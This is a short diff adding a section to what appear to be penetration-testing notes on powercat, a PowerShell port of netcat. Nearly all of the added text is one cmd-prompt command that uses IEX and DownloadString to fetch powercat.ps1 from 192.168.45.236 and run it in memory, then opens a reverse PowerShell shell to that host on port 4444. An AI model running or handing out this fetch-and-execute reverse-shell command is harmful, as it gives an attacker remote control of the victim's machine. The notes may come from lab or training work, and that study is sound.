@@ -27,4 +27,10 @@ we have powercat implementation of nc in
 ```
 
 
+for cmdprompt
+```cmdprompt
+powershell -Command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.236/powercat.ps1'); powercat -c 192.168.45.236 -p 4444 -e powershell"
+
+```
+
 
